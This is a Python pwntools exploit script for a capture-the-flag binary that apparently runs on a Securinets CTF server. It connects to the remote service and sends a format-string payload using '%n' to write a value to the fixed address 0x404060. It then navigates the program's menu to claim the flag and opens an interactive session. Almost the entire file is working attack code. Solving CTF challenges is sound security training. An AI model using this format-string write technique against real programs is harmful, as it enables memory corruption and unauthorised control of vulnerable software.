#!/usr/bin/env python3

from pwn import *

exe = ELF("./main")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("pwn.ctf.securinets.tn", 8988)
    return r


def main():
    r = conn()
    
    r.sendline(b'2')
    
    pause()
    payload = b'aaaaaa%5000u%8$n'
    payload += p64(0x404060)

    r.sendline(payload)

    r.sendline(b"1") # Go Shopping
    r.sendline(b"5") # Flag

    r.interactive()



if __name__ == "__main__":
    main()
